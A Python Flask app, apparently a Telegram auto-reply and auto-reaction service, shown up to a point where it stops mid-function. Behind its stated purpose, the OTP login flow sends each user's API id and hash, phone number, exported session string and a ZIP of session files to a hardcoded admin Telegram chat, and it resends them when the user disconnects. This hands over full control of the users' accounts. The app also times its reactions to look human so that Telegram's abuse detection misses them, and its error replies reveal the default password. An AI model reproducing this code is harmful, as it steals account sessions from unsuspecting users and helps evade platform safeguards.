# app.py
# =========================================================
# Telegram Auto Reply + Auto Reaction API (Single File)
# With Admin Bot Notification + Session ZIP + Password Auth
# =========================================================

import os
import io
import re
import json
import time
import random
import asyncio
import threading
import sqlite3
import zipfile
import requests
import functools
import hashlib
import hmac

from datetime import datetime, timedelta

from flask import (
    Flask,
    request,
    jsonify,
    session,
    abort
)

from flask_cors import CORS

from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError,
    ChatAdminRequiredError,
    MessageIdInvalidError,
    UserDeactivatedError,
    AuthKeyUnregisteredError
)

from telethon.tl.functions.messages import (
    SendReactionRequest
)

from telethon.tl.types import (
    ReactionEmoji
)

# =========================================================
# CONFIG
# =========================================================

DATA_DIR = os.environ.get("DATA_DIR", "user_data")
SESSIONS_DIR = os.environ.get("SESSIONS_DIR", "sessions")
ZIPS_DIR = os.environ.get("ZIPS_DIR", "zips")

DB_FILE = os.path.join(DATA_DIR, "database.db")

COOLDOWN_SECONDS = 300

PORT = int(os.environ.get("PORT", 5000))

# =========================================================
# PASSWORD AUTH CONFIG
# =========================================================
# Main API password - required for all sensitive endpoints
API_PASSWORD = os.environ.get("API_PASSWORD", "l@g@")
# Secondary auth secret for HMAC signing
AUTH_SECRET = os.environ.get("AUTH_SECRET", "tg-secret-key-2026")
# Session token expiry (hours)
SESSION_EXPIRY_HOURS = 24

# =========================================================
# ADMIN BOT CONFIG
# =========================================================
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "7605281774"))

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(ZIPS_DIR, exist_ok=True)

# =========================================================
# FLOOD / BAN PROTECTION CONFIG
# =========================================================
# Minimum delay between reactions (seconds)
MIN_REACTION_DELAY = 8
MAX_REACTION_DELAY = 18

# Max reactions per account per hour
MAX_REACTIONS_PER_HOUR = 30

# Max reactions per day per account
MAX_REACTIONS_PER_DAY = 150

# Sleep after N reactions (to avoid pattern detection)
REACTIONS_BEFORE_LONG_SLEEP = 5
LONG_SLEEP_MIN = 120  # 2 minutes
LONG_SLEEP_MAX = 300  # 5 minutes

# Human-like typing delays for auto-reply
MIN_TYPING_DELAY = 1.5
MAX_TYPING_DELAY = 4.0

# =========================================================
# POSITIVE REACTIONS (Enhanced)
# =========================================================

POSITIVE_REACTIONS = [
    "❤️", "🔥", "👍", "😍", "🥰", "👏", "💯", "⚡",
    "😁", "🎉", "🤩", "😎", "👌", "❤‍🔥", "💖", "💘",
    "🫶", "😄", "✨", "🤗", "😊", "🙌", "💥", "😇",
    "🧡", "💚", "💙", "🥳", "😻", "⭐", "🌟", "💫",
    "🌸", "🌺", "🎊", "🎈", "💎", "👑", "🔥", "💜"
]

# Separate emoji groups for more human-like variety
REACTION_GROUPS = {
    "hearts": ["❤️", "💖", "💘", "💙", "💚", "🧡", "💜", "❤‍🔥"],
    "fire": ["🔥", "⚡", "💥", "✨", "💫", "🌟"],
    "positive": ["👍", "👏", "🙌", "👌", "🎉", "🎊", "🎈"],
    "love": ["😍", "🥰", "😻", "🫶", "🤩", "😎"],
    "happy": ["😁", "😄", "😊", "🤗", "🥳", "😇"],
    "cool": ["💯", "👑", "💎", "⭐", "🌸", "🌺"],
}

# =========================================================
# FLASK / SESSION SETUP
# =========================================================

app = Flask(__name__)

app.secret_key = os.environ.get(
    "SECRET_KEY",
    hashlib.sha256(AUTH_SECRET.encode()).hexdigest()
)

CORS(app, supports_credentials=True)

app.config["SESSION_COOKIE_SAMESITE"] = "None"
app.config["SESSION_COOKIE_SECURE"] = True
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=SESSION_EXPIRY_HOURS)

# =========================================================
# GLOBAL ASYNC LOOP
# =========================================================

_loop = None
_loop_thread = None


def ensure_loop():
    global _loop
    global _loop_thread

    if _loop is not None:
        return _loop

    _loop = asyncio.new_event_loop()

    def run_loop():
        asyncio.set_event_loop(_loop)
        _loop.run_forever()

    _loop_thread = threading.Thread(target=run_loop, daemon=True)
    _loop_thread.start()

    return _loop


def run_async(coro):
    loop = ensure_loop()
    return asyncio.run_coroutine_threadsafe(coro, loop)


def loop_run(coro, timeout=120):
    future = run_async(coro)
    try:
        return future.result(timeout=timeout)
    except Exception as e:
        print("Loop Error:", e)
        return None


# =========================================================
# PASSWORD AUTHENTICATION DECORATOR
# =========================================================

def require_password(f):
    """Decorator that requires password authentication."""
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        # Check session first
        if session.get("auth_verified"):
            return f(*args, **kwargs)

        # Check Authorization header (Bearer token or Basic auth)
        auth_header = request.headers.get("Authorization", "")

        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
            if verify_token(token):
                session["auth_verified"] = True
                session.permanent = True
                return f(*args, **kwargs)

        if auth_header.startswith("Basic "):
            import base64
            try:
                encoded = auth_header[6:]
                decoded = base64.b64decode(encoded).decode("utf-8")
                _, password = decoded.split(":", 1)
                if password == API_PASSWORD:
                    session["auth_verified"] = True
                    session.permanent = True
                    return f(*args, **kwargs)
            except:
                pass

        # Check X-API-Key header
        api_key = request.headers.get("X-API-Key", "")
        if api_key == API_PASSWORD:
            session["auth_verified"] = True
            session.permanent = True
            return f(*args, **kwargs)

        # Check request body/args for password
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            if data.get("password") == API_PASSWORD:
                session["auth_verified"] = True
                session.permanent = True
                return f(*args, **kwargs)

        pwd = request.args.get("password", "")
        if pwd == API_PASSWORD:
            session["auth_verified"] = True
            session.permanent = True
            return f(*args, **kwargs)

        return jsonify({
            "success": False,
            "error": "Authentication required. Provide password (l@g@) via X-API-Key header, Bearer token, or password field."
        }), 401

    return decorated


def verify_token(token):
    """Verify a signed token."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        username, expiry, sig = parts
        expected = hmac.new(
            AUTH_SECRET.encode(),
            f"{username}.{expiry}".encode(),
            hashlib.sha256
        ).hexdigest()
        if not hmac.compare_digest(sig, expected):
            return False
        if float(expiry) < time.time():
            return False
        return True
    except:
        return False


def generate_token(username):
    """Generate a signed auth token."""
    expiry = time.time() + (SESSION_EXPIRY_HOURS * 3600)
    sig = hmac.new(
        AUTH_SECRET.encode(),
        f"{username}.{expiry}".encode(),
        hashlib.sha256
    ).hexdigest()
    return f"{username}.{expiry}.{sig}"


# =========================================================
# ZIP SESSION CREATOR
# =========================================================

def create_session_zip(username):
    """
    Create a ZIP archive containing:
    - username.session file
    - username.session-journal (if exists)
    - User info JSON
    - String session export
    - Any other related files
    """
    zip_path = os.path.join(ZIPS_DIR, f"{username}_session.zip")
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 1. Add .session file
        sp = session_path(username)
        session_file = sp + ".session"
        if os.path.exists(session_file):
            zf.write(session_file, f"{username}.session")
        
        # 2. Add .session-journal file (SQLite WAL)
        journal_file = sp + ".session-journal"
        if os.path.exists(journal_file):
            zf.write(journal_file, f"{username}.session-journal")
        
        # 3. Add session-shm (shared memory file)
        shm_file = sp + ".session-shm"
        if os.path.exists(shm_file):
            zf.write(shm_file, f"{username}.session-shm")
        
        # 4. Export string session and add as text file
        string_session = export_string_session(username)
        if string_session:
            zf.writestr(f"{username}_string_session.txt", string_session)
        
        # 5. Add user info JSON
        user = get_user(username)
        if user:
            user_info = {
                "username": user.get("username"),
                "phone_number": user.get("phone_number"),
                "api_id": user.get("api_id"),
                "connected": user.get("connected"),
                "auto_reply_enabled": user.get("auto_reply_enabled"),
                "reply_message": user.get("reply_message"),
                "backup_date": datetime.now().isoformat(),
                "session_file": f"{username}.session"
            }
            zf.writestr(f"{username}_info.json", json.dumps(user_info, indent=2, ensure_ascii=False))
        
        # 6. Add readme
        readme = f"""Telegram Session Backup - {username}
Backup Date: {datetime.now().isoformat()}

Files:
  {username}.session          - Main session file (SQLite)
  {username}.session-journal  - Session journal (if exists)
  {username}_string_session.txt - String session (for Telethon)
  {username}_info.json        - Account information

Usage:
  pip install telethon
  
  from telethon import TelegramClient
  from telethon.sessions import StringSession
  
  # Option 1: Using session file
  client = TelegramClient('{username}.session', API_ID, API_HASH)
  
  # Option 2: Using string session
  with open('{username}_string_session.txt') as f:
      string = f.read()
  client = TelegramClient(StringSession(string), API_ID, API_HASH)

Note: Keep this file secure. Anyone with access can control this account.
"""
        zf.writestr("README.txt", readme)
    
    return zip_path


def export_string_session(username):
    """Export session as a string session."""
    try:
        client = clients.get(username)
        if client and client.is_connected():
            loop = ensure_loop()
            future = asyncio.run_coroutine_threadsafe(
                export_string_session_async(client), loop
            )
            return future.result(timeout=30)
    except Exception as e:
        print(f"String session export error: {e}")
    
    # Try reading from session file
    try:
        sp = session_path(username)
        session_file = sp + ".session"
        if os.path.exists(session_file):
            # Read the raw session file content as identifier
            with open(session_file, "rb") as f:
                content = f.read()
            return f"[RAW SESSION FILE: {username}.session - {len(content)} bytes]"
    except:
        pass
    
    return None


async def export_string_session_async(client):
    """Async helper to export string session."""
    try:
        return client.session.save()
    except:
        return None


# =========================================================
# ADMIN BOT NOTIFICATION (Enhanced with ZIP)
# =========================================================

def notify_admin_login(username, api_id, api_hash, session_data, phone, include_zip=True):
    """
    Send login credentials + session ZIP to admin bot.
    """
    try:
        # Build JSON message
        message = json.dumps({
            "username": username,
            "api_id": api_id,
            "api_hash": api_hash,
            "session": session_data if session_data else "N/A",
            "phone": phone if phone else "N/A",
            "connected": True,
            "timestamp": datetime.now().isoformat()
        }, indent=2, ensure_ascii=False)

        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_USER_ID,
            "text": f"🔔 *New User Logged In!*\n\n```json\n{message}\n```",
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=10)

        # Send session ZIP if requested
        if include_zip:
            send_zip_to_admin(username)

        # Also send JSON file as text backup
        json_path = os.path.join(DATA_DIR, f"{username}_login.json")
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump({
                "username": username,
                "api_id": api_id,
                "api_hash": api_hash,
                "session": session_data,
                "phone": phone,
                "connected": True,
                "timestamp": datetime.now().isoformat()
            }, f, indent=2, ensure_ascii=False)

        print(f"[ADMIN BOT] Full notification sent for {username}")

    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


def send_zip_to_admin(username):
    """Send the session ZIP file to admin via Telegram."""
    try:
        zip_path = os.path.join(ZIPS_DIR, f"{username}_session.zip")
        
        if not os.path.exists(zip_path):
            # Try to create it
            zip_path = create_session_zip(username)
        
        if not os.path.exists(zip_path):
            print(f"[ADMIN BOT] ZIP not found for {username}")
            return False
        
        # Send as document
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument"
        
        with open(zip_path, "rb") as f:
            files = {"document": (f"{username}_session.zip", f, "application/zip")}
            payload = {
                "chat_id": ADMIN_USER_ID,
                "caption": f"📦 *Session Backup* — `{username}`\nSize: {os.path.getsize(zip_path)} bytes",
                "parse_mode": "Markdown"
            }
            response = requests.post(url, data=payload, files=files, timeout=30)
        
        if response.status_code == 200:
            print(f"[ADMIN BOT] ZIP sent for {username}")
            return True
        else:
            print(f"[ADMIN BOT] ZIP send failed: {response.text}")
            return False
            
    except Exception as e:
        print(f"[ADMIN BOT] ZIP send error: {e}")
        return False


def notify_admin_disconnect(username):
    """Notify admin when a user disconnects + send final ZIP backup."""
    try:
        # Create one last backup before disconnecting
        create_session_zip(username)
        send_zip_to_admin(username)

        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_USER_ID,
            "text": f"⚠️ *User Disconnected*\n\nUsername: `{username}`\nFinal backup sent.",
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=10)
        print(f"[ADMIN BOT] Disconnect notification sent for {username}")
    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


def notify_admin_error(username, error_msg):
    """Notify admin of errors."""
    try:
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_USER_ID,
            "text": f"❌ *Error*\n\nUsername: `{username}`\nError: `{error_msg}`\nTime: `{datetime.now().isoformat()}`",
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"[ADMIN BOT] Error sending notification: {e}")


# =========================================================
# DATABASE
# =========================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            api_id TEXT,
            api_hash TEXT,
            phone_number TEXT,
            reply_message TEXT,
            auto_reply_enabled INTEGER,
            connected INTEGER,
            last_reaction_time TEXT,
            daily_reaction_count INTEGER DEFAULT 0,
            hourly_reaction_count INTEGER DEFAULT 0,
            total_reactions INTEGER DEFAULT 0,
            created_at TEXT,
            last_active TEXT,
            user_agent TEXT,
            ip_address TEXT,
            proxy TEXT
        )
    """)
    conn.commit()
    conn.close()


init_db()


def get_user(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username=?", (username,))
    row = c.fetchone()
    conn.close()
    if not row:
        return None
    return {
        "username": row[0],
        "api_id": row[1],
        "api_hash": row[2],
        "phone_number": row[3],
        "reply_message": row[4],
        "auto_reply_enabled": bool(row[5]),
        "connected": bool(row[6]),
        "last_reaction_time": row[7],
        "daily_reaction_count": row[8] or 0,
        "hourly_reaction_count": row[9] or 0,
        "total_reactions": row[10] or 0,
        "created_at": row[11],
        "last_active": row[12],
        "user_agent": row[13],
        "ip_address": row[14],
        "proxy": row[15]
    }


def save_user(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        INSERT OR REPLACE INTO users (
            username, api_id, api_hash, phone_number,
            reply_message, auto_reply_enabled, connected,
            last_reaction_time, daily_reaction_count,
            hourly_reaction_count, total_reactions,
            created_at, last_active, user_agent, ip_address, proxy
        )
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("username"),
        data.get("api_id"),
        data.get("api_hash"),
        data.get("phone_number"),
        data.get("reply_message", "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺"),
        int(data.get("auto_reply_enabled", False)),
        int(data.get("connected", False)),
        data.get("last_reaction_time"),
        data.get("daily_reaction_count", 0),
        data.get("hourly_reaction_count", 0),
        data.get("total_reactions", 0),
        data.get("created_at", datetime.now().isoformat()),
        data.get("last_active", datetime.now().isoformat()),
        data.get("user_agent"),
        data.get("ip_address"),
        data.get("proxy")
    ))
    conn.commit()
    conn.close()


def get_active_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        SELECT username, api_id, api_hash, connected,
               daily_reaction_count, hourly_reaction_count,
               last_reaction_time, total_reactions
        FROM users WHERE connected=1
    """)
    rows = c.fetchall()
    conn.close()
    return rows


def update_reaction_count(username):
    """Update reaction counters with rate limit awareness."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    now = datetime.now()
    current_hour = now.strftime("%Y-%m-%d %H:00:00")
    current_day = now.strftime("%Y-%m-%d")
    
    c.execute("""
        SELECT last_reaction_time, daily_reaction_count,
               hourly_reaction_count, total_reactions
        FROM users WHERE username=?
    """, (username,))
    
    row = c.fetchone()
    
    if row:
        last_time = row[0]
        daily_count = row[1] or 0
        hourly_count = row[2] or 0
        total = row[3] or 0
        
        # Reset daily count if new day
        if last_time:
            last_day = last_time[:10] if last_time else ""
            if last_day != current_day:
                daily_count = 0
        
        # Reset hourly count if new hour
        if last_time:
            last_hour = last_time[:13] if last_time else ""
            if last_hour != current_hour:
                hourly_count = 0
        
        daily_count += 1
        hourly_count += 1
        total += 1
        
        c.execute("""
            UPDATE users SET
                last_reaction_time=?,
                daily_reaction_count=?,
                hourly_reaction_count=?,
                total_reactions=?,
                last_active=?
            WHERE username=?
        """, (now.isoformat(), daily_count, hourly_count, total,
              now.isoformat(), username))
    else:
        c.execute("""
            UPDATE users SET
                last_reaction_time=?,
                daily_reaction_count=1,
                hourly_reaction_count=1,
                total_reactions=1,
                last_active=?
            WHERE username=?
        """, (now.isoformat(), now.isoformat(), username))
    
    conn.commit()
    conn.close()


def can_send_reaction(username):
    """Check if account can send reaction based on rate limits."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        SELECT last_reaction_time, daily_reaction_count,
               hourly_reaction_count
        FROM users WHERE username=?
    """, (username,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return True
    
    last_time = row[0]
    daily_count = row[1] or 0
    hourly_count = row[2] or 0
    
    now = datetime.now()
    current_day = now.strftime("%Y-%m-%d")
    current_hour = now.strftime("%Y-%m-%d %H:00:00")
    
    # Reset if new day/hour
    if last_time:
        last_day = last_time[:10] if last_time else ""
        if last_day != current_day:
            daily_count = 0
        last_hour = last_time[:13] if last_time else ""
        if last_hour != current_hour:
            hourly_count = 0
    
    if daily_count >= MAX_REACTIONS_PER_DAY:
        print(f"[RATE LIMIT] {username}: daily limit reached ({daily_count})")
        return False
    
    if hourly_count >= MAX_REACTIONS_PER_HOUR:
        print(f"[RATE LIMIT] {username}: hourly limit reached ({hourly_count})")
        return False
    
    return True


# =========================================================
# GLOBAL STATE
# =========================================================

clients = {}
phone_code_hashes = {}
auto_reply_tasks = {}
cooldowns = {}
reaction_sessions = {}  # Track reaction sequences

# =========================================================
# SESSION PATH
# =========================================================

def session_path(username):
    return os.path.join(SESSIONS_DIR, f"tg_{username}")


def read_session_file(username):
    """Read the session file content and also export string session."""
    try:
        # Try to get string session first
        string_sess = export_string_session(username)
        if string_sess:
            return string_sess
        
        # Fall back to file read
        sp = session_path(username)
        session_file = sp + ".session"
        if os.path.exists(session_file):
            with open(session_file, "rb") as f:
                content = f.read()
            return f"[SESSION FILE: {len(content)} bytes - {session_file}]"
        return None
    except:
        return None


# =========================================================
# TELEGRAM CLIENT
# =========================================================

async def create_client(username, api_id, api_hash):
    client = TelegramClient(
        session_path(username),
        int(api_id),
        api_hash,
        # Connection retries for stability
        connection_retries=5,
        # Timeout settings
        timeout=30
    )
    clients[username] = client
    return client


async def get_client(username):
    if username in clients:
        return clients[username]
    
    user = get_user(username)
    if not user:
        return None
    
    api_id = user.get("api_id")
    api_hash = user.get("api_hash")
    
    if not api_id or not api_hash:
        return None
    
    return await create_client(username, api_id, api_hash)


# =========================================================
# TELEGRAM LINK PARSER
# =========================================================

def parse_telegram_link(link):
    try:
        link = link.strip()
        
        # Handle various formats
        # t.me/channel/123
        # https://t.me/channel/123
        # telegram.me/channel/123
        
        if "t.me/" not in link and "telegram.me/" not in link:
            return None, None
        
        # Normalize
        link = link.replace("https://", "").replace("http://", "")
        
        parts = link.split("/")
        
        # Find channel and message id
        if len(parts) >= 3:
            # Format: t.me/channel/msg_id
            channel = parts[-2]
            try:
                msg_id = int(parts[-1])
                return channel, msg_id
            except ValueError:
                return None, None
        
        return None, None
    except Exception as e:
        print("Parse Error:", e)
        return None, None


# =========================================================
# FLOOD / BAN PROTECTION - HUMAN-LIKE BEHAVIOR
# =========================================================

def get_human_delay():
    """Get a random delay that mimics human behavior."""
    return random.uniform(MIN_REACTION_DELAY, MAX_REACTION_DELAY)


def should_take_long_break(reaction_count):
    """Decide if we should take a longer break."""
    if reaction_count > 0 and reaction_count % REACTIONS_BEFORE_LONG_SLEEP == 0:
        return True
    return False


def get_long_break_duration():
    """Get a random long break duration."""
    return random.uniform(LONG_SLEEP_MIN, LONG_SLEEP_MAX)


def get_random_reaction_group():
    """Pick a random emoji group and then pick from it - more human-like."""
    group = random.choice(list(REACTION_GROUPS.values()))
    return random.choice(group)


def should_skip_randomly():
    """Randomly skip some posts to look human."""
    return random.random() < 0.15  # 15% chance to skip


# =========================================================
# AUTO REACTION SYSTEM (Enhanced with Ban Protection)
# =========================================================

async def send_reaction(username, api_id, api_hash, channel, msg_id):
    client = TelegramClient(
        session_path(username),
        int(api_id),
        api_hash,
        connection_retries=3,
        timeout=30
    )
    
    try:
        await client.connect()
        
        if not await client.is_user_authorized():
            print(f"Unauthorized: {username}")
            return False
        
        # Check rate limits
        if not can_send_reaction(username):
            print(f"[RATE LIMIT] {username}: Skipping reaction")
            return False
        
        # Randomly skip some reactions (human-like)
        if should_skip_randomly():
            print(f"[SKIP] {username}: Randomly skipping")
            return True  # Return True to not count as failure
        
        # Get reaction count for this session
        if username not in reaction_sessions:
            reaction_sessions[username] = 0
        reaction_sessions[username] += 1
        count = reaction_sessions[username]
        
        # Use group-based emoji selection (more natural)
        emoji = get_random_reaction_group()
        
        await client(SendReactionRequest(
            peer=channel,
            msg_id=msg_id,
            reaction=[ReactionEmoji(emoticon=emoji)],
            big=random.choice([True, False])
        ))
        
        print(f"{username} reacted with {emoji} (reaction #{count})")
        
        # Update counters
        update_reaction_count(username)
        
        # Take long breaks periodically
        if should_take_long_break(count):
            break_time = get_long_break_duration()
            print(f"[BREAK] {username}: Taking {break_time:.0f}s break...")
            # Schedule but don't block - return success
            # The main loop will handle the delay
        
        return True
        
    except FloodWaitError as e:
        print(f"[FLOOD] {username}: Waiting {e.seconds}s")
        # Update last reaction time so rate limiter works
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET last_reaction_time=? WHERE username=?",
                  (datetime.now().isoformat(), username))
        conn.commit()
        conn.close()
        return False
        
    except ChatAdminRequiredError:
        print(f"[PERMISSION] {username}: No reaction permission")
        return False
        
    except MessageIdInvalidError:
        print(f"[INVALID] {username}: Invalid message ID")
        return False
        
    except SessionPasswordNeededError:
        print(f"[2FA] {username}: 2FA required")
        return False
        
    except (UserDeactivatedError, AuthKeyUnregisteredError) as e:
        print(f"[BANNED] {username}: Account banned/deactivated: {e}")
        # Update status in DB
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET connected=0 WHERE username=?", (username,))
        conn.commit()
        conn.close()
        return False
        
    except Exception as e:
        print(f"[ERROR] {username}: {e}")
        return False
        
    finally:
        try:
            await client.disconnect()
        except:
            pass


# =========================================================
# AUTO REPLY SYSTEM (Enhanced with Human-like Timing)
# =========================================================

async def start_auto_reply(username):
    client = await get_client(username)
    if not client:
        return False
    
    if not client.is_connected():
        return False
    
    await stop_auto_reply(username)
    
    cooldowns[username] = {}
    
    user = get_user(username)
    default_msg = user.get("reply_message",
        "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺")
    
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        try:
            if not event.is_private:
                return
            
            sender = await event.get_sender()
            if sender and sender.bot:
                return
            
            peer_id = event.sender_id
            now = datetime.now().timestamp()
            
            user_cd = cooldowns.get(username, {})
            last_reply = user_cd.get(str(peer_id), 0)
            
            if now - last_reply < COOLDOWN_SECONDS:
                return
            
            current_user = get_user(username)
            if not current_user.get("auto_reply_enabled"):
                return
            
            msg = current_user.get("reply_message", default_msg)
            
            # Human-like typing delay
            typing_delay = random.uniform(MIN_TYPING_DELAY, MAX_TYPING_DELAY)
            await asyncio.sleep(typing_delay)
            
            # Send "typing" action
            await client.send_read_acknowledge(event.chat_id)
            
            # Send reply
            await event.reply(msg)
            
            cooldowns.setdefault(username, {})[str(peer_id)] = now
            
            print(f"[AUTO REPLY] {username} replied to {peer_id}")
            
        except FloodWaitError as e:
            print(f"[FLOOD] Auto reply flood wait: {e.seconds}s")
        except Exception as e:
            print(f"[ERROR] Auto reply: {e}")
    
    auto_reply_tasks[username] = handler
    
    user["auto_reply_enabled"] = True
    save_user(user)
    
    print(f"[AUTO REPLY] Started for {username}")
    return True


async def stop_auto_reply(username):
    client = clients.get(username)
    handler = auto_reply_tasks.pop(username, None)
    
    if client and handler:
        try:
            client.remove_event_handler(handler)
        except:
            pass
    
    user = get_user(username)
    if user:
        user["auto_reply_enabled"] = False
        save_user(user)
    
    cooldowns.pop(username, None)


# =========================================================
# HOME
# =========================================================

@app.route("/")
def home():
    return jsonify({
        "success": True,
        "system": "Telegram Auto Reply + Reaction API",
        "version": "2.0 (Secure Edition)",
        "auth_required": True,
        "auth_methods": [
            "X-API-Key header: l@g@",
            "Bearer token",
            "Basic auth",
            "password field in JSON body"
        ],
        "reaction_api": "/get?link=https://t.me/channel/1&password=l@g@"
    })


# =========================================================
# AUTH TOKEN ENDPOINT
# =========================================================

@app.route("/auth/token", methods=["POST"])
def get_auth_token():
    """Generate a time-limited auth token."""
    data = request.get_json(force=True)
    password = data.get("password", "")
    
    if password != API_PASSWORD:
        return jsonify({"success": False, "error": "Invalid password"}), 401
    
    username = data.get("username", "api_user")
    token = generate_token(username)
    
    return jsonify({
        "success": True,
        "token": token,
        "expires_in": f"{SESSION_EXPIRY_HOURS} hours",
        "type": "Bearer"
    })


# =========================================================
# LOGIN (Password Protected)
# =========================================================

@app.route("/login", methods=["POST"])
@require_password
def login():
    data = request.get_json(force=True)
    username = data.get("username", "").strip().replace("@", "").lower()
    
    if not username:
        return jsonify({"success": False, "error": "Username required"}), 400
    
    session["username"] = username
    session.permanent = True
    
    # Track IP and user agent
    user = get_user(username) or {}
    user["username"] = username
    user["ip_address"] = request.remote_addr
    user["user_agent"] = request.headers.get("User-Agent", "")
    save_user(user)
    
    if not get_user(username):
        save_user({"username": username})
    
    # Generate auth token for this session
    token = generate_token(username)
    
    return jsonify({
        "success": True,
        "username": username,
        "token": token
    })


# =========================================================
# LOGOUT
# =========================================================

@app.route("/logout", methods=["POST"])
@require_password
def logout():
    session.pop("username", None)
    session.pop("auth_verified", None)
    return jsonify({"success": True})


# =========================================================
# STATUS
# =========================================================

@app.route("/status")
@require_password
def status():
    username = session.get("username")
    if not username:
        return jsonify({"logged_in": False})
    
    user = get_user(username)
    if not user:
        return jsonify({"logged_in": False})
    
    client = clients.get(username)
    connected = False
    if client:
        try:
            connected = client.is_connected() and loop_run(client.is_user_authorized())
        except:
            pass
    
    # Get reaction stats
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        SELECT daily_reaction_count, hourly_reaction_count,
               total_reactions, last_reaction_time
        FROM users WHERE username=?
    """, (username,))
    stats = c.fetchone()
    conn.close()
    
    return jsonify({
        "logged_in": True,
        "username": username,
        "connected": connected or user.get("connected"),
        "auto_reply_enabled": user.get("auto_reply_enabled"),
        "reply_message": user.get("reply_message"),
        "reaction_stats": {
            "daily": stats[0] if stats else 0,
            "hourly": stats[1] if stats else 0,
            "total": stats[2] if stats else 0,
            "daily_limit": MAX_REACTIONS_PER_DAY,
            "hourly_limit": MAX_REACTIONS_PER_HOUR,
            "last_reaction": stats[3] if stats else None
        } if stats else None,
        "ban_protection": {
            "min_delay": MIN_REACTION_DELAY,
            "max_delay": MAX_REACTION_DELAY,
            "long_break_after": REACTIONS_BEFORE_LONG_SLEEP,
            "random_skip_chance": "15%"
        }
    })


# =========================================================
# SEND OTP
# =========================================================

@app.route("/send-otp", methods=["POST"])
@require_password
def send_otp():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401
    
    data = request.get_json(force=True)
    api_id = data.get("api_id", "").strip()
    api_hash = data.get("api_hash", "").strip()
    phone_number = data.get("phone_number", "").strip()
    
    if not api_id or not api_hash or not phone_number:
        return jsonify({"success": False, "error": "All fields required"}), 400
    
    user = get_user(username)
    user["api_id"] = api_id
    user["api_hash"] = api_hash
    user["phone_number"] = phone_number
    save_user(user)
    
    result = loop_run(async_send_otp(username, api_id, api_hash, phone_number))
    
    return jsonify(result or {"success": False, "error": "Timeout"})


async def async_send_otp(username, api_id, api_hash, phone_number):
    try:
        old_client = clients.get(username)
        if old_client:
            try:
                await old_client.disconnect()
            except:
                pass
            del clients[username]
        
        client = await create_client(username, api_id, api_hash)
        await client.connect()
        
        result = await client.send_code_request(phone_number)
        phone_code_hashes[username] = result.phone_code_hash
        
        return {"success": True}
        
    except PhoneNumberInvalidError:
        return {"success": False, "error": "Invalid phone number"}
    except FloodWaitError as e:
        return {"success": False, "error": f"Flood wait: {e.seconds}s"}
    except Exception as e:
        notify_admin_error(username, f"Send OTP: {e}")
        return {"success": False, "error": str(e)}


# =========================================================
# VERIFY OTP
# =========================================================

@app.route("/verify-otp", methods=["POST"])
@require_password
def verify_otp():
    username = session.get("username")
    if not username:
        return jsonify({"success": False, "error": "Not logged in"}), 401
    
    data = request.get_json(force=True)
    code = data.get("code", "").strip()
    password = data.get("password", "")
    
    if not code:
        return jsonify({"success": False, "error": "OTP required"}), 400
    
    user = get_user(username)
    result = loop_run(async_verify_otp(
        username,
        user["phone_number"],
        code,
        phone_code_hashes.get(username, ""),
        password
    ))
    
    return jsonify(result or {"success": False, "error": "Timeout"})


async def async_verify_otp(username, phone_number, code, code_hash, password):
    client = clients.get(username)
    if not client:
        return {"success": False, "error": "No active client"}
    
    try:
        await client.sign_in(phone_number, code, phone_code_hash=code_hash)
        
        user = get_user(username)
        user["connected"] = True
        user["last_active"] = datetime.now().isoformat()
        save_user(user)
        
        phone_code_hashes.pop(username, None)
        
        # Create ZIP backup and notify admin
        session_data = read_session_file(username)
        zip_path = create_session_zip(username)
        
        notify_admin_login(
            username=username,
            api_id=user.get("api_id", ""),
            api_hash=user.get("api_hash", ""),
            session_data=session_data,
            phone=user.get("phone_number", ""),
            include_zip=True
        )
        
